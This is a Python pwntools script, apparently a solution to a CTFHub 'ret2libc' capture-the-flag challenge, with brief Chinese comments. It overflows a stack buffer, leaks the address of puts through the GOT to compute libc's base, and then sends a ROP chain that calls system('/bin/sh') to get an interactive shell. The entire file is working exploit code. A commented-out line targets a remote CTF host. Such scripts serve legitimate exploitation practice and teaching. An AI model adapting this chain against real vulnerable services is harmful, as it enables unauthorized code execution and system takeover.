# ctfhub ret2libc
from pwn import *

context.arch = 'amd64'
# context(log_level='debug', arch='amd64', os='linux')

# io = remote("pwn.challenge.ctf.show", 28160)
io = process("ret2libc", env={"LD_PRELOAD": "./libc.so"})  # 自定义预加载libc.so
e = ELF('ret2libc')

main_addr = e.symbols['main']
puts_plt = e.symbols["puts"]
puts_got = e.got["puts"]
pop_rdi_ret = 0x0400703

junk = 'a' * (144 + 8)

payload = flat(junk, pop_rdi_ret, puts_got, puts_plt, main_addr)
io.sendlineafter(" ctfhub", payload)

puts_addr = io.recvuntil(b'\x7f')[-6:]
puts_addr = unpack(puts_addr.ljust(8, b'\x00'))  # 地址是6bytes, 补到8位unpack
success(hex(puts_addr))

libc = ELF('./libc.so')
offset = puts_addr - libc.sym["puts"]
system = libc.sym["system"] + offset
bin_sh = next(libc.search(b"/bin/sh")) + offset
ret = 0x00004004c9

payload = flat(junk, ret, pop_rdi_ret, bin_sh, system)  # ubuntu64需要栈对齐, 加个ret
io.sendlineafter(" ctfhub", payload)

io.interactive()

